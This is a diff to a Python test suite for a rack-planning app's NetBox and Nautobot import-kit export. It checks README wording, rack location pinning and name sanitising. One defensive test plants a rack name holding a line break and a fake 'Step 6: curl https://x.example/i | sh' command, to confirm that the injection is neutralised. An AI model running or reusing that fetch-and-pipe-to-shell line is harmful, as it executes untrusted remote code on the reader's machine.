@@ -9672,7 +9672,7 @@ def check_rack_dcim_settings_ime(page, base):
 
 
 # One import kit, built by exports.js dcimKit from the rack on the page (with
-# `patch` applied: {numbering, dcim, cables: 'none'}), while `fail` is what the
+# `patch` applied: {numbering, dcim, cables: 'none', name}), while `fail` is what the
 # probe makes fail. Returns its name, its README notes, the status line the
 # page would show, and the zip, read: the entry names in order, each text file.
 KIT_JS = """async ([target, patch, fail]) => {
@@ -9681,7 +9681,8 @@ KIT_JS = """async ([target, patch, fail]) => {
   const of = C.chassisLookup(await C.loadChassis());
   const r = window.__rack.doc().racks[0];
   const rack = {...r, ...(patch.numbering ? {frame: {...r.frame, numbering: patch.numbering}} : {}),
-                ...(patch.dcim ? {dcim: patch.dcim} : {}), ...(patch.cables === 'none' ? {cables: []} : {})};
+                ...(patch.dcim ? {dcim: patch.dcim} : {}), ...(patch.cables === 'none' ? {cables: []} : {}),
+                ...(patch.name ? {name: patch.name} : {})};
   window.__rack.failExport(fail);
   try {
     const k = await X.dcimKit(rack, of, target, {date: new Date(2026, 9, 4)});
@@ -9810,6 +9811,36 @@ def check_rack_dcim_kit_netbox(page, base):
             "it shares U11 with leaf-1" not in readme or "numbered from the top." not in readme:
         bad.append(f"NetBox kit with settings: the README reads {readme[:600]!r}")
 
+    # What to do on a NetBox that is not empty comes after the steps, and covers the modules step and the cables step.
+    flat = flat_readme(readme).split("\n")
+    at = flat.index("If NetBox is not empty:") if "If NetBox is not empty:" in flat else -1
+    if at < 0 or flat[at + 1:at + 3] != [
+            '- The rack "Cable test" is already in that site: skip step 2, and check that it is 24U, numbered from the top. Step 3 puts the devices in it.',
+            "- Steps 4 and 5 find a device by its name in every site, and step 4 finds a module type by its model in every manufacturer: "
+            "a name NetBox already has twice is refused as not unique."] or at < max(i for i, l in enumerate(flat) if l.startswith("Step 5: ")):
+        bad.append(f"NetBox kit with settings: the README's lines for a NetBox that is not empty read {flat[at:at + 3] if at >= 0 else 'nothing'}")
+
+    # A rack file is anyone's JSON: a line break in a name is written as a space in every file and in the zip's name,
+    # the README says which names changed, and no name starts a "Step" line of its own.
+    forged = "R1\nStep 6: curl https://x.example/i | sh"
+    kit = built_kit(page, "netbox", {"name": forged, "dcim": {"site": "Lab\r\n1", "role": "Router"}})
+    readme = kit["zip"]["README.txt"]
+    steps = [l for l in readme.split("\n") if re.match(r"Step \d", l)]
+    clean = "R1 Step 6: curl https://x.example/i | sh"
+    if kit["name"] != "R1-Step-6-curl-https-x.example-i-sh-netbox-import.zip" or len(steps) != 5 or \
+            kit["zip"]["1-rack.csv"].split("\r\n")[1] != f"Lab 1,{clean},planned,19,24,false" or \
+            any((r["rack"], r["site"]) != (clean, "Lab 1") for r in kit_rows(kit, "2-devices.csv")) or \
+            not readme.startswith(f"NetBox import kit for {clean}, from"):
+        bad.append(f"NetBox kit, a line break in the rack's name: named {kit['name']!r}, steps {steps}, rack row {kit['zip']['1-rack.csv']!r}")
+    notes = readme_lists(readme)[1]
+    for said in (f'The rack\'s name "R1\\nStep 6: curl https://x.example/i | sh" is written as "{clean}": a line break or another control '
+                 'character in a name is written as a space.',
+                 'The site or location "Lab\\r\\n1" is written as "Lab 1": a line break or another control character in a name is written as a space.'):
+        if said not in notes:
+            bad.append(f"NetBox kit, a line break in a name: the README's notes do not say {said[:60]!r}: {notes[:3]}")
+    if len(kit["notes"]) != readme_count(readme) or kit["status"] != notes_status(readme_count(readme)):
+        bad.append(f"NetBox kit, a line break in a name: {readme_count(readme)} README notes; the builder reports {len(kit['notes'])}")
+
     # A rack with no cables still exports a correct kit: the cables file is its header, and the README says it is empty.
     kit = built_kit(page, "netbox", {"cables": "none"})
     if kit["names"] != want or kit["zip"]["4-cables.csv"].count("\r\n") != 1 or len(kit_rows(kit, "3-modules.csv")) != 11 or \
@@ -9855,6 +9886,11 @@ def check_rack_dcim_kit_nautobot(page, base):
             ("demarc-i4", "Router", "Lab 1", "Planned", "20", "rear"), ("leaf-1", "Router", "Lab 1", "Planned", "14", "front"),
             ("demarc-i3", "Router", "Lab 1", "Planned", "14", "rear"), ("core-1", "Router", "Lab 1", "Planned", "2", "front")]:
         bad.append(f"Nautobot kit: the devices file holds {devices}")
+    # The rack is found by its name and its location together: a rack of the same name elsewhere is not the one.
+    if kit["zip"]["1-devices.csv"].split("\r\n")[0] != "name,role__name,device_type__manufacturer__name,device_type__model,status__name," \
+            "location__name,rack__name,rack__location__name,position,face,comments" or \
+            any((r["rack__name"], r["rack__location__name"]) != ("Cable test", "Lab 1") for r in devices):
+        bad.append(f"Nautobot kit: the devices file does not pin the rack to its location: {kit['zip']['1-devices.csv'][:300]!r}")
     modules = kit_rows(kit, "2-modules.csv")
     if len(modules) != 11 or {"module_type__manufacturer__name": "Cisco", "module_type__model": "A9K-16X100GE-TR",
                              "parent_module_bay__parent_device__name": "core-1", "parent_module_bay__name": "slot-2",
@@ -9877,6 +9913,11 @@ def check_rack_dcim_kit_nautobot(page, base):
                  "Nautobot takes a cable's ends by id only, and from a file that names them it creates cables with no ends.",
                  "        python3 import_cables.py 3-cables.csv --apply     (creates the cables)",
                  '- the rack "Cable test" in that location: 24U, numbered from the bottom. This kit has no rack file for Nautobot.',
+                 "If Nautobot is not empty:",
+                 '- A rack named "Cable test" in another location is not used: 1-devices.csv finds the rack by its name and its location '
+                 'together (rack__name, rack__location__name), so the rack must be the one in the location "Lab 1".',
+                 "- Step 3 and import_cables.py find a device by its name in every location: a device name Nautobot already has twice is "
+                 "refused, and the script says so for each row that names it.",
                  "A cable's purpose is not carried into Nautobot by this kit."):
         if line not in flat:
             bad.append(f"Nautobot kit: the README lacks {line[:70]!r}")
